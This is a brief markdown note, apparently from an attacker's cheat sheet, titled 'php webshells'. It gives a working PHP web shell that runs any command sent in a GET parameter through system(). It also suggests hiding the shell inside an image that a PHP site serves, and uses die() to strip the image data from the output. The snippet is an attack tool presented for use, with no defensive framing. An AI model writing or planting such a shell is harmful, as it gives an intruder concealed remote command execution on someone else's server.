# php webshells


> php site using php to show images, we can hide an shell in an image
```php
if(isset($_GET['invae']  ))
{
	system($_GET['invae']);
}
die(); 
```
`die()` removes the image garbage, making our shell easier to use



